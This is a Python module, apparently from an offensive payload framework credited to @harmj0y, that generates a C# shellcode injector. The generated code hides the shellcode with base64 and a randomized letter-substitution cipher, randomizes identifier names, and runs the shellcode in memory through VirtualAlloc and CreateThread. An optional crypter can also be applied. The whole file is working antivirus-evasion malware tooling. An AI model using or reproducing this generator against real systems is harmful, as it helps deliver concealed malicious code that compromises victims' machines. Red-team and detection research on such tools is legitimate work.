"""

C# inline injector that utilizes base64 encoding and a randomized alphabetic
letter substitution cipher to obscure the shellcode string in the payload.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

import string, random

from modules.common import shellcode
from modules.common import encryption
from modules.common import helpers

class Payload:

    def __init__(self):
        # required
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Normal"
        self.description = "C# method that base64/letter substitutes the shellcode to inject"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_ARYA"       : ["N", "Use the Arya crypter"]
                                }

    def generate(self):

        Shellcode = self.shellcode.generate(self.required_options)

        # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
        key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
        base64payload = encryption.b64sub(Shellcode,key)

        # randomize all our variable names, yo'
        namespaceName = helpers.randomString()
        className = helpers.randomString()
        shellcodeName = helpers.randomString()
        funcAddrName = helpers.randomString()

        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        baseStringName = helpers.randomString()
        targetStringName = helpers.randomString()

        decodeFuncName = helpers.randomString()
        base64DecodeFuncName = helpers.randomString()
        dictionaryName = helpers.randomString()


        payloadCode = "using System; using System.Net; using System.Text; using System.Linq; using System.Net.Sockets;"
        payloadCode += "using System.Collections.Generic; using System.Runtime.InteropServices;\n"

        payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (namespaceName, className, decodeFuncName)
        payloadCode += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" %(baseStringName)
        payloadCode += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" %(targetStringName,dictionaryName)
        payloadCode += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" %(baseStringName,dictionaryName,baseStringName)
        payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" %(targetStringName, dictionaryName)
        payloadCode += "else { %s += t[i]; }} return %s; }\n" %(targetStringName,targetStringName)


        encodedDataName = helpers.randomString()
        encodedBytesName = helpers.randomString()

        payloadCode += "static public string %s(string %s) {\n" %(base64DecodeFuncName,encodedDataName)
        payloadCode += "byte[] %s = System.Convert.FromBase64String(%s);\n" %(encodedBytesName,encodedDataName)
        payloadCode += "return System.Text.ASCIIEncoding.ASCII.GetString(%s);}\n" %(encodedBytesName)

        base64PayloadName = helpers.randomString()
        payloadCode += "static void Main() {\n"
        payloadCode += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
        payloadCode += "string key = \"%s\";\n" %(key)
        payloadCode += "string p = (%s(%s(%s, key)).Replace(\"\\\\\", \",0\")).Substring(1);\n" %(base64DecodeFuncName, decodeFuncName, base64PayloadName)
        payloadCode += "string[] chars = p.Split(',').ToArray();\n"
        payloadCode += "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
        payloadCode += "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)

        payloadCode += "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, shellcodeName)
        payloadCode += "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
        payloadCode += "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
        payloadCode += "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" %(hThreadName)

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]

        # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payloadCode = encryption.arya(payloadCode)

        return payloadCode

